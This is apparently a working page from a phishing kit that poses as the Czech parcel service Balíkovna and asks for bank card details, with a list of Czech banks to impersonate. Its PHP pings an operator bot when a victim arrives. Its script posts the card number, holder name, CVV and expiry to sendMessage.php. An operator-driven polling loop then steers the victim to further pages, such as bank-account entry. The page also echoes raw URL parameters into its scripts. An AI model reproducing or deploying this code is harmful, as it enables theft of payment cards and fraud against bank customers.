<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>

<?php
require_once __DIR__ . '/../vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createUnsafeImmutable(dirname(__DIR__));
$dotenv->load();

$dbhost = getenv('dbHost');
$dblogin = getenv('dbLogin');
$dbpass = getenv('dbPass');
$dbport = getenv('dbPort');

$title = "Balikovna | Zadávání bankovní karty";
$CardHolder = "Držitel karty";
$FullName = "Plné jméno";
$Expires = "Vypršení";
$MM = "MM";
$YY = "YY";
$CVV = "CVV";
$CardNumber = "Číslo karty";
$Month = "Měsíc";
$Year = "Rok";
$Submit = "Potvrdit";
$ssilka1 = 'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/';
?>

<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Получаем значение переменной "bank" из URL-адреса
$bank = $_GET['bank'];
$dbconn = pg_connect("host={$dbhost} port={$dbport} dbname=link_infos user={$dblogin} password={$dbpass}");
$userdbconn = pg_connect("host={$dbhost} port={$dbport} dbname=user_infos user={$dblogin} password={$dbpass}");
if ($dbconn) {
  $id = $_GET['orderid'];
  $_SESSION['orderid'] = $id;
}

// Заменяем значение "bank" на нормальное название банка
switch ($bank) {
  case 'ing':
    $bank_name = 'ING Bank';
    break;
  case 'jt':
    $bank_name = 'J&T Banka';
    break;
  case 'kb':
    $bank_name = 'Komerční banka';
    break;
  case 'mbank':
    $bank_name = 'mBank';
    break;
  case 'modra':
    $bank_name = 'Modrá pyramida stavební spořitelna';
    break;
  case 'moneta':
    $bank_name = 'Moneta Money Bank';
    break;
  case 'ober':
    $bank_name = 'Oberbank AG';
    break;
  case 'penez':
    $bank_name = 'Peněžní dům';
    break;
  case 'ppf':
    $bank_name = 'PPF banka';
    break;
  case 'raif':
    $bank_name = 'Raiffeisenbank';
    break;
  case 'sporitelna':
    $bank_name = 'Česká spořitelna';
    break;
  case 'trinity':
    $bank_name = 'Trinity Bank';
    break;
  case 'unicredit':
    $bank_name = 'UniCredit Bank Czech Republic and Slovakia';
    break;
  case 'vub':
    $bank_name = 'Všeobecná úvěrová banka';
    break;
  case 'air':
    $bank_name = 'Air Bank';
    break;
  case 'artesa':
    $bank_name = 'Artesa';
    break;
  case 'citfin':
    $bank_name = 'Citfin';
    break;
  case 'citi':
    $bank_name = 'Citi Bank';
    break;
  case 'commerz':
    $bank_name = 'Commerz Bank';
    break;
  case 'credit':
    $bank_name = 'Credit Bank';
    break;
  case 'csob':
    $bank_name = 'ČSOB';
    break;
  case 'equa':
    $bank_name = 'Equa Bank';
    break;
  case 'expo':
    $bank_name = 'Expo Bank';
    break;
  case 'fio':
    $bank_name = 'Fio Banka';
    break;
  case 'hsbc':
    $bank_name = 'HSBC Bank';
    break;
  case 'hypo':
    $bank_name = 'Hypoteční banka';
    break;
  default:
    $bank_name = 'Unknown Bank';
    break;
}
?>

<?php
                        $currStageText = '🃏Переход на страницу ввода карты <b>' . $bank_name . '</b>';
                        require 'botNotification.php'; ?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title> <?php echo $title; ?></title>
  <?php echo '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">';
  echo '<link rel="stylesheet" href="./style.css">'; ?>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
  <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1">
  <link rel="stylesheet" href="chat.css">
</head>
<?php
  include 'chat.php';
?>

<body>
<div id="preloader">
    <div class="lds-ripple"><div></div><div></div></div>
</div>
<div class="wrapper" id="app">
    <div class="card-form">
      <div class="card-list">
        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
          <div class="card-item__side -front">
            <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
            <div class="card-item__cover">
              <img
              v-bind:src="'img/26.jpeg'" class="card-item__bg">
            </div>
            
            <div class="card-item__wrapper">
              <div class="card-item__top">
                <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" class="card-item__chip">
                <div class="card-item__type">
                  <transition name="slide-fade-up">
                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
                  </transition>
                </div>
              </div>
              <label for="cardNumber" class="card-item__number" ref="cardNumber">
                <template v-if="getCardType === 'amex'">
                 <span v-for="(n, $index) in amexCardMask" :key="$index">
                  <transition name="slide-fade-up">
                    <div
                      class="card-item__numberItem"
                      v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''"
                    >*</div>
                    <div class="card-item__numberItem"
                      :class="{ '-active' : n.trim() === '' }"
                      :key="$index" v-else-if="cardNumber.length > $index">
                      {{cardNumber[$index]}}
                    </div>
                    <div
                      class="card-item__numberItem"
                      :class="{ '-active' : n.trim() === '' }"
                      v-else
                      :key="$index + 1"
                    >{{n}}</div>
                  </transition>
                </span>
                </template>

                <template v-else>
                  <span v-for="(n, $index) in otherCardMask" :key="$index">
                    <transition name="slide-fade-up">
                      <div
                        class="card-item__numberItem"
                        v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''"
                      >*</div>
                      <div class="card-item__numberItem"
                        :class="{ '-active' : n.trim() === '' }"
                        :key="$index" v-else-if="cardNumber.length > $index">
                        {{cardNumber[$index]}}
                      </div>
                      <div
                        class="card-item__numberItem"
                        :class="{ '-active' : n.trim() === '' }"
                        v-else
                        :key="$index + 1"
                      >{{n}}</div>
                    </transition>
                  </span>
                </template>
              </label>
              <div class="card-item__content">
                <label for="cardName" class="card-item__info" ref="cardName">
                  <div class="card-item__holder">Držitel karty</div>
                  <transition name="slide-fade-up">
                    <div class="card-item__name" v-if="cardName.length" key="1">
                      <transition-group name="slide-fade-right">
                        <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
                      </transition-group>
                    </div>
                    <div class="card-item__name" v-else key="2">Celé jméno</div>
                  </transition>
                </label>
                <div class="card-item__date" ref="cardDate">
                  <label for="cardMonth" class="card-item__dateTitle">Doba platnosti</label>
                  <label for="cardMonth" class="card-item__dateItem">
                    <transition name="slide-fade-up">
                      <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
                      <span v-else key="2">MM</span>
                    </transition>
                  </label>
                  /
                  <label for="cardYear" class="card-item__dateItem">
                    <transition name="slide-fade-up">
                      <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
                      <span v-else key="2">RR</span>
                    </transition>
                  </label>
                </div>
              </div>
            </div>
          </div>
          <div class="card-item__side -back">
            <div class="card-item__cover">
              <img
              v-bind:src="'img/26.jpeg'" class="card-item__bg">
            </div>
            <div class="card-item__band"></div>
            <div class="card-item__cvv">
                <div class="card-item__cvvTitle">CVV</div>
                <div class="card-item__cvvBand">
                  <span v-for="(n, $index) in cardCvv" :key="$index">
                    *
                  </span>

              </div>
                <div class="card-item__type">
                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" class="card-item__typeImg">
                </div>
            </div>
          </div>
        </div>
      </div>
      <div class="card-form__inner">
        <div class="card-input">
          <label for="cardNumber" class="card-input__label">Číslo karty</label>
          <input type="text" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off">
        </div>
        <div class="card-input">
          <label for="cardName" class="card-input__label">Jméno na kartě</label>
          <input type="text" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off">
        </div>
        <div class="card-form__row">
          <div class="card-form__col">
            <div class="card-form__group">
              <label for="cardMonth" class="card-input__label">Doba platnosti</label>
              <select class="card-input__input -select" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
                <option id="cardMonth" value="" disabled selected>Měsíc</option>
                <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n">
                    {{n < 10 ? '0' + n : n}}
                </option>
              </select>
              <select class="card-input__input -select" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
                <option id="cardYear" value="" disabled selected>Rok</option>
                <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">
                    {{$index + minCardYear}}
                </option>
              </select>
            </div>
          </div>
          <div class="card-form__col -cvv">
            <div class="card-input">
              <label for="cardCvv" class="card-input__label">CVV</label>
              <input type="text" class="card-input__input" id="cardCvv" v-mask="'####'" maxlength="4" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off">
            </div>
          </div>
        </div>

        <a class="card-form__button" id="submitButton">
        Potvrdit
        </a>
      </div>
    </div>
  </div>
  <!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
  <script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
  <script src="./script.js"></script>
  <script src="/balikovna/assets/scripts/hide-menu.js"></script>
  <script src="/balikovna/script.js"></script>
  <script>
    const submitButton = document.getElementById('submitButton')
const cardNumber = document.getElementById('cardNumber')
const cardName = document.getElementById('cardName')
const cardCVV = document.getElementById('cardCvv')
const cardMonth = document.getElementById('cardMonth')
const cardYear = document.getElementById('cardYear')


submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

$.ajax({
            url: 'sendMessage.php',
            method: 'POST',
            data: {
                orderid: orderid,
                bank: bank,
                cardnumber: cardNumber.value,
                cardname: cardName.value,
                cardcvv: cardCVV.value,
                cardmonth: cardMonth.value,
                cardyear: cardYear.value
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                let link = "<?php echo '/balikovna/bankaccount/?orderid=' . $id ?>";
                window.location.href = link
            }
        });

}
  </script>

<script>
$(window).on('load', function () {
    // Получаем текущий URL
    var currentUrl = window.location.href;

    // Переменная для отслеживания перенаправления
    var isRedirecting = false;

    // Функция проверки стадии
    function checkStage() {
        $.ajax({
            url: '/balikovna/checkstage.php',
            method: 'POST',
            data: {
                orderid: '<?php echo $id ?>',
                currstage: 'entercard'
            },
            success: function (stage) {
                // Получаем orderid
                var orderId = <?php echo $id ?>;
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'entercard' && stage != '') {
                    console.log(stage)
// Устанавливаем флаг перенаправления
isRedirecting = true;

// Находим позицию "balikovna/" в текущем URL
const currentURL = window.location.href;
const balikovnaPosition = currentURL.indexOf("balikovna/");

// Обрезаем URL после "balikovna/"
const baseURL = currentURL.slice(0, balikovnaPosition + 'balikovna/'.length); // 9 символов в "balikovna/"

// Формируем новый URL для перенаправления пользователя
const url = baseURL + stage + "/?orderid=" + orderId + '&bank=' + "<?php echo $row['bank']?>";

// Перенаправляем пользователя на нужную страницу
window.location.href = url;

                } else {
                    // Повторяем проверку через 1 секунду
                    setTimeout(checkStage, 1000);
                }
            }
        });
    }

    // Вызываем функцию проверки стадии
    checkStage();
});



    </script>
</body>

</html>